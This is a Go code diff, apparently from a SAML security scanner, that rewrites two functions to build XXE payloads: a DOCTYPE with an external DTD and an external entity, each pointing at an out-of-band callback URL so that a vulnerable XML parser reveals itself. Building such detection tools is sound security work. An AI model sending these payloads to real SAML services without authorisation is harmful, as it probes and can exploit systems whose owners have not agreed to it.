@@ -66,8 +66,11 @@ func extractIDAttribute(content string) string {
 	return ""
 }
 
-// InjectDOCTYPE creates a payload with DOCTYPE injection.
-func InjectDOCTYPE(doc *XMLDocument, decoded *DecodedSAML) (string, error) {
+// InjectDOCTYPE creates a payload with an external-DTD DOCTYPE pointing at the
+// supplied out-of-band (OAST) callback URL. If the target's XML parser loads the
+// external DTD subset, it fetches systemURL and the OAST server records an
+// interaction — the only signal that confirms the parser processes external DTDs.
+func InjectDOCTYPE(doc *XMLDocument, decoded *DecodedSAML, systemURL string) (string, error) {
 	if doc.HasDoctype {
 		return "", errors.New("document already has DOCTYPE")
 	}
@@ -75,14 +78,18 @@ func InjectDOCTYPE(doc *XMLDocument, decoded *DecodedSAML) (string, error) {
 	// Remove XML declaration if present
 	content := removeXMLDeclaration(doc.Content)
 
-	// Inject DOCTYPE before XML content
-	payload := `<!DOCTYPE root SYSTEM "example.dtd">` + content
+	// Inject an external-DTD DOCTYPE referencing the OAST callback URL.
+	payload := fmt.Sprintf(`<!DOCTYPE root SYSTEM "%s">`, systemURL) + content
 
 	return EncodeSAML(payload, decoded), nil
 }
 
-// InjectENTITY creates a payload with ENTITY injection.
-func InjectENTITY(doc *XMLDocument, decoded *DecodedSAML) (string, error) {
+// InjectENTITY creates a payload that declares an external general entity pointing
+// at the supplied OAST callback URL and references it in the document body (in
+// place of the original ID value). If the parser resolves and expands the entity,
+// it fetches systemURL and the OAST server records an interaction — out-of-band
+// proof of XXE, replacing the previous response-shape heuristic.
+func InjectENTITY(doc *XMLDocument, decoded *DecodedSAML, systemURL string) (string, error) {
 	if doc.HasDoctype {
 		return "", errors.New("document already has DOCTYPE")
 	}
@@ -98,12 +105,12 @@ func InjectENTITY(doc *XMLDocument, decoded *DecodedSAML) (string, error) {
 	placeholder := "PLACEHOLDER_UUID_" + randomString(8)
 	modifiedContent := replaceIDValue(content, doc.IDAttrVal, placeholder)
 
-	// Create DOCTYPE with ENTITY referencing original ID
-	doctype := fmt.Sprintf(`<!DOCTYPE foo [ <!ENTITY uuid SYSTEM "%s"> ]>`, doc.IDAttrVal)
+	// Declare an external entity pointing at the OAST callback URL.
+	doctype := fmt.Sprintf(`<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "%s"> ]>`, systemURL)
 
-	// Build final payload
+	// Build final payload, referencing the entity where the ID value used to be.
 	payload := doctype + modifiedContent
-	payload = strings.Replace(payload, placeholder, "&uuid;", 1)
+	payload = strings.Replace(payload, placeholder, "&xxe;", 1)
 
 	return EncodeSAML(payload, decoded), nil
 }
